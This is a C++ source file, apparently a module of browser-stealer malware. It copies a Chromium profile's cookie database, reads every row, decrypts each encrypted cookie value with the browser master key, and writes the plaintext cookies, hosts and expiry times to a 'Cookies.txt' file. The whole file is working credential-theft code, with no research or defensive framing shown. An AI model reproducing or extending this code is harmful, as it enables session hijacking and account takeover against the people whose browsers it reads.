//
// Created by .1qxz on 09.06.2024.
//

#include "CCookies.h"

void CCookies::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "Network" / "Cookies";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<Cookie> cookies = this->getCookies(copied_db);

    fs::remove(copied_db);

    if(cookies.empty())
        return;

    std::stringstream ss;

    for(Cookie &cookie : cookies)
        cookie.write(ss, false);

    Utils::writeFile(root / "Cookies.txt", ss.str(), true);
}

std::list<Cookie> CCookies::getCookies(const fs::path &db_path) {
    std::list<Cookie> cookies;

    SQLiteUtil::connectAndRead("SELECT host_key, name, value, encrypted_value, path, expires_utc FROM cookies", db_path, [this, &cookies](sqlite3_stmt *stmt) {
        const unsigned char* host_key = sqlite3_column_text(stmt, 0);
        const unsigned char* name = sqlite3_column_text(stmt, 1);
        const unsigned char* value = sqlite3_column_text(stmt, 2);
        const void* encrypted_value = sqlite3_column_blob(stmt, 3);
        int encrypted_value_size = sqlite3_column_bytes(stmt, 3);
        const unsigned char* path = sqlite3_column_text(stmt, 4);
        long long expires_utc = sqlite3_column_int64(stmt, 5);

        Cookie cookieRecord;
        cookieRecord.host_key = std::string(reinterpret_cast<const char*>(host_key));
        cookieRecord.name = std::string(reinterpret_cast<const char*>(name));
        cookieRecord.path = std::string(reinterpret_cast<const char*>(path));
        cookieRecord.expires_utc = expires_utc;

        std::vector<BYTE> encoded_value;
        encoded_value.assign(static_cast<const unsigned char*>(encrypted_value), static_cast<const unsigned char*>(encrypted_value) + encrypted_value_size);

        std::vector<BYTE> master_key = this->getMasterKey();
        std::string decoded_value = ChromiumUtil::decryptData(encoded_value, master_key);

        cookieRecord.value = decoded_value;

        if(decoded_value.empty())
            cookieRecord.value = std::string(reinterpret_cast<const char*>(value));

        cookies.push_back(cookieRecord);
    });

    return cookies;
}
